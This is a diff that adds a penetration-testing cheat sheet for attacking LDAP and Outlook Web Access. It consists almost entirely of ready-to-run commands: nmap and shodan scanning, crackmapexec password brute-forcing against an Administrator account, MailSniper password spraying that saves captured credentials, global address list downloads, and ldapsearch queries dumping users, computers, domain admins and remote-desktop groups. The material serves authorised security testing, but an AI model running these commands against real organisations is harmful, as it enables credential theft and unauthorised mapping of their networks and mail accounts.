@@ -1,0 +1,111 @@
+LDAP-OWA
+
+
+Lightweight Directory Access Protocol
+Leverages Kerberos v5 for authentication.
+
+ip=10.0.0.10
+echo $ip
+
+shodan host $ip
+
+nmap -Pn -n -T4 --open $ip
+nmap -Pn -n -T4 --open -p389,636,3269 --script=ldap*,ssl* $ip
+---------------------------------------------------------------------------------------------------------------------
+
+crackmapexec ldap $ip -u Administrator -p passwords.txt
+crackmapexec ldap $ip --port 636 -u Administrator -p passwords.txt
+---------------------------------------------------------------------------------------------------------------------
+
+# Autodiscover
+
+https://autodiscover.target.com/autodiscover/autodiscover.xml
+https://target.com/autodiscover/autodiscover.xml
+---------------------------------------------------------------------------------------------------------------------
+
+# SprayingToolkit
+
+This will show the internal domain name.
+atomizer.py owa 'https://webmail.target.com/Autodiscover' --recon
+atomizer.py owa 'https://webmail.target.com/ews/exchange.asmx' --recon
+---------------------------------------------------------------------------------------------------------------------
+
+# LDAPdomainDump
+
+ldapdomaindump -u domain\\username -p password --no-json --no-grep ldaps://ip$:port
+---------------------------------------------------------------------------------------------------------------------
+
+# MailSniper
+
+- Import the module.
+PS C:\> ipmo C:\Tools\MailSniper\MailSniper.ps1
+
+- Enumerate the NetBIOS name of the target domain.
+PS C:\> Invoke-DomainHarvestOWA -ExchHostname <mail server IP>
+
+PS C:\> Invoke-SelfSearch -Mailbox joe.smith@target.com -Remote
+PS C:\> Invoke-SelfSearch -Mailbox joe.smith@target.com -ExchHostname webmail.target.com
+
+- Perform a password spray.
+PS C:\> Invoke-PasswordSprayOWA -ExchHostname mail.target.com -UserList C:\users.txt -Password Spring2022! -OutFile creds.txt
+
+- Download the GAL.
+PS C:\> GetGlobalAddressList -UserName domain\username -Password Spring2022! -ExchHostname webmail.target.com/ews/exchange.asmx -OutFile gal.txt
+---------------------------------------------------------------------------------------------------------------------
+
+# Apache Directory Studio, using valid creds, port 636
+
+File > New > LDAP Browser > LDAP Connection > Next
+Connection name: 636
+Hostname: target IP
+Port: 636
+Encryption method: Use SSL
+Authentication Method: Simple Authentication
+User: domain\user Check Authentication
+
+- Search
+LDAP - New Search
+Search Name: admin accounts
+Connection > Browse: select the name you entered <636>
+Search Base > Browse: select the root of the domain
+Filter: (cn=admin*)
+Returning Attributes: cn, mail, description
+Search results may take a few seconds to return.
+
+- Reuse a search
+Expand Searches in the bottom left lane
+Right-click > Copy Search
+Select Search > right-click > Paste Search
+Edit as needed > Apply and Close
+---------------------------------------------------------------------------------------------------------------------
+
+# Enumerate anonymous or null binding
+ldapsearch -x -H ldap://URI:port/ -b "searchbase" -s sub
+
+# Enumerate anonymous or null binding
+ldapsearch -x -b "dc=target,dc=com" "*" -h $ip | awk '/dn: / {print $2}'
+
+# Unauthenticated Bind Enumeration (DN with no password)
+ldapsearch -x -D "cn=admin,dc=target,dc=com" -s sub "cn=*" -h $ip | awk '/uid: /{print $2}' | nl
+
+# Extract  users
+ldapsearch -x -h <IP> -D 'DOMAIN\username' -w 'password' -b "CN=Users,DC=target,DC=com"
+
+# Extract computers
+ldapsearch -x -h <IP> -D 'DOMAIN\username' -w 'password' -b "CN=Computers,DC=<SUBDOMAIN>,DC=<TDL>"
+
+# Extract my info
+ldapsearch -x -h <IP> -D 'DOMAIN\username' -w 'password' -b "CN=<MY NAME>,CN=Users,DC=<SUBDOMAIN>,DC=<TDL>"
+
+# Extract domain admins
+ldapsearch -x -h <IP> -D 'DOMAIN\username' -w 'password' -b "CN=Domain Admins,CN=Users,DC=<1_SUBDOMAIN>,DC=<TDL>"
+
+# Extract administrators
+ldapsearch -x -h <IP> -D 'DOMAIN\username' -w 'password' -b "CN=Administrators,CN=Builtin,DC=<SUBDOMAIN>,DC=<TDL>"
+
+# Extract remote desktop group
+ldapsearch -x -h <IP> -D 'DOMAIN\username' -w 'password' -b "CN=Remote Desktop Users,CN=Builtin,DC=<SUBDOMAIN>,DC=<TDL>"
+---------------------------------------------------------------------------------------------------------------------
+
+https://github.com/franc-pentest/ldeep
+https://github.com/codewatchorg/PowerSniper
